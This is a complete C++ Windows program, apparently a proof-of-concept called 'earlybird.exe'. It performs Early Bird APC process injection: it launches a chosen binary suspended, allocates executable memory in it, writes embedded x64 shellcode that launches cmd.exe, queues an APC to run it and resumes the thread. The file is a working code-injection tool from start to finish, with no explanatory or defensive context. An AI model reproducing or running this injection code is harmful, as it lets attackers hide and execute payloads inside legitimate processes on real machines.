#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
	printf("[*] [%s] PID: [%d]\r\n", argv[0], GetCurrentProcessId());

	if (argc != 2)
	{
		printf("Usage: earlybird.exe [binary]\n");
		return 1;
	}

	unsigned char sc_x64[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
		"\x2e\x65\x78\x65\x00";

	/* Start process in suspended state */
	printf("[*] Creating process in suspended state\r\n");

	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

	CreateProcessA(0, argv[1],0,0,0,CREATE_SUSPENDED,0,0,pStartupInfo,pProcessInfo);

	if (!pProcessInfo->hProcess)
	{
		printf("[-] Error creating process\r\n");
		return -1;
	}
	else
	{
		printf("[+] Create process successful!\r\n");
	}

	/* Allocate memory in target process */
	printf("[*] Allocating memory in process\r\n");
	LPVOID lpBaseAddress;
	lpBaseAddress = VirtualAllocEx(pProcessInfo->hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		printf("[-] Couldn't allocate memory in process, exiting...\r\n");
		return -1;
	}
	else
	{
		printf("[+] Memory allocated at: 0x%x\r\n", (UINT)lpBaseAddress);
	}


	SIZE_T *lpNumberOfBytesWritten = 0;
	printf("[*] Writing shellcode to process\r\n");

	BOOL resWPM;
	resWPM = WriteProcessMemory(pProcessInfo->hProcess, lpBaseAddress, (LPVOID)sc_x64, sizeof(sc_x64), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		printf("[-] Couldn't write to memory in target process, exiting...\r\n");
		return -1;
	}
	else
	{
		printf("[+] Shellcode is written to memory\r\n");
	}



	/* Update subclass with fake function pointer */
	DWORD i = (DWORD)lpBaseAddress;

	printf("[*] Queue APC\r\n");
	/* Queue APC */
	DWORD qapcret = QueueUserAPC((PAPCFUNC)lpBaseAddress, pProcessInfo->hThread, NULL);
	if (!qapcret)
	{
		printf("[-] Couldn't queue APC in target process, exiting...\r\n");
	}
	else
	{
		printf("[+] QueueAPC is done\r\n");
	}
	/* Resume Thread */
	printf("[*] Resuming thread....\r\n");
	DWORD tpsc = ResumeThread(pProcessInfo->hThread);
	printf("[*] ResumeThread(...): [%ld]\r\n", tpsc);

	WaitForSingleObject(pProcessInfo->hProcess, -1);
	DWORD exitcode;
	bool rv = GetExitCodeProcess(pProcessInfo->hProcess, &exitcode);
	printf("[*] exitcode [%d]", exitcode);

	return exitcode;
}

